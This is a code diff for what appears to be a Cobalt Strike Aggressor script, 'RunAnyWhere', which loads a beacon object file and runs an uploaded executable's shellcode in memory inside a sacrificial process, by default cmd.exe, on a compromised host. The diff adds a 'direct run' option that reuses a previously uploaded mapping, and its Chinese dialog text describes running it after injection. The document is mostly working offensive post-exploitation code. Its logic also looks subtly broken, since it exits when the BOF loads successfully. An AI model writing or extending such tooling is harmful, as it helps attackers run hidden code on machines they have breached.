@@ -38,7 +38,24 @@ sub runAnyWhere{
   $bid = $3['bid'];
   $pename = $3['target'].$3['param'];
   $mapname = $3['map'];
+  $isrun = $3['run'];
   btask($bid, "******* RunAnyWhere v0.1 *******");
+
+
+
+  # load bof
+  $bofBytes = loadBOF($bid);
+  if($bofBytes != $null){
+      return;
+  }
+
+  if($isrun eq "true"){
+    blog($bid,"[!] Runing already map $mapname");
+    $state = 9999;
+    $args = bof_pack($bid, "zziiii", $mapname, $pename, $state, 0, 0, 0) ;
+    beacon_inline_execute($bid, $bofBytes, "go", $args);
+    return;
+  }
 
   # read frp shellcode
   $shellcode_path = $3['file'] ;
@@ -47,12 +64,6 @@ sub runAnyWhere{
   }else{
     blog($bid,"[!] The shellcode file $shellcode_path doesn't exist");
     return;
-  }
-
-  # load bof
-  $bofBytes = loadBOF($bid);
-  if($bofBytes != $null){
-      return;
   }
 
   $total_size = strlen($shellcode_data);
@@ -95,11 +106,12 @@ sub runAnyWhere{
 sub runAnyWhereDialog{
   #$random = "random".rand(1000000);
 	$dialog = dialog("内存运行",%(bid => $1,target => "C:\\WINDOWS\\SYSTEM32\\CMD.EXE", map => $random), &runAnyWhere);
-	dialog_description($dialog, "非免杀用！注入后再操作！傀儡进程是64位只能起64位程序，32位数同理");
+	dialog_description($dialog, "非免杀用！注入后再操作！傀儡进程是64位只能起64位程序，32位数同理，标识ID一致可以用直接运行免去再次上传");
 	drow_text($dialog, "target",  "傀儡进程路径:");
 	drow_text($dialog, "param",  "运行参数(要加空格):");
-  drow_text($dialog, "map",  "标识ID(不要用同一个ID):");
+  drow_text($dialog, "map",  "标识ID(不同程序不同ID):");
 	drow_file($dialog, "file", "要运行的EXE:");
+  drow_checkbox($dialog, "run", "直接运行: ", "是否直接运行(请确保标识ID正确并且之前已经上传过)");
 	dbutton_action($dialog, "GO!");
 	dialog_show($dialog);
 }
